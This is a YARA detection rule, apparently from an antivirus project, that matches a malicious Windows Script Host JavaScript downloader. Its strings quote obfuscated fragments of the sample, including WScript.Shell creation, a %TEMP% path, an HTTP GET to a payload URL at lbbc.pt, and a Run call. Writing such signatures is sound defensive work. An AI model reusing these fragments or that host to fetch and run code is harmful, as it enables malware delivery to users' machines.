rule sig_20160427_8cf19d018abb143a191aa150e2dba8a9 {
  meta:
    description = "datamaliciousorder - file 20160427_8cf19d018abb143a191aa150e2dba8a9.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9394fcc31d242b41b2b0121fedaf0e89c7c72637e83eac602b4914946d4f1f4f"

  strings:
    $s1  = "function WcwlcYggva() {return QeblzYxdjh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"H6IFHUX" ascii
    $s2  = "function WcwlcYggva() {return QeblzYxdjh[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"H6IFHUX" ascii
    $s3  = "function EpzrbMbjox(DusqjYgeqy, NzptdWvklu){CwwdgPlecl = CwwdgPlecl * 1; return DusqjYgeqy - NzptdWvklu;};" fullword ascii
    $s4  = "var QeblzYxdjh = function GrakkCnqno() {return ZojumEeboq[BofhdMjzlz](\"WScript\"+\".Shell\");}(), NwsgtPsccf = 11;" fullword ascii
    $s5  = "IjhbvOfxkh[XugurUxwcv](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s6  = "var ZojumEeboq = this[\"WScript\"];" fullword ascii
    $s7  = "if (IjhbvOfxkh[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function IvobgQwsjr(){return QrngjCmiso + \"\";};" fullword ascii
    $s9  = "function OsxtvYtjjh() {return ((BdpmiRfjos == true) && (BdpmiRfjos == ZqlszOxxfs)) ? 1 : CwwdgPlecl;};" fullword ascii
    $s10 = "var ZqlszOxxfs = false;" fullword ascii
    $s11 = "EipwkOeuue = true;" fullword ascii
    $s12 = "function WrsxmApfsf(CsczhMguiu){QeblzYxdjh[\"R\"+\"un\"](CsczhMguiu, CwwdgPlecl, CwwdgPlecl);};" fullword ascii
    $s13 = "function DpertHjggy(){return BofhdMjzlz;};" fullword ascii
    $s14 = "function DkfdgFdncf()" fullword ascii
    $s15 = "BdpmiRfjos = true; " fullword ascii
    $s16 = "var BdpmiRfjos = false;" fullword ascii
    $s17 = "function UcpgwTbmub(){return 23;};" fullword ascii
    $s18 = "}while (AiskkNqsnl);" fullword ascii
    $s19 = "return EpzrbMbjox(YwrroTuzvs, KdwitFygwm);" fullword ascii
    $s20 = "var HhmsoPyiri = new this[\"D\"+\"ate\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}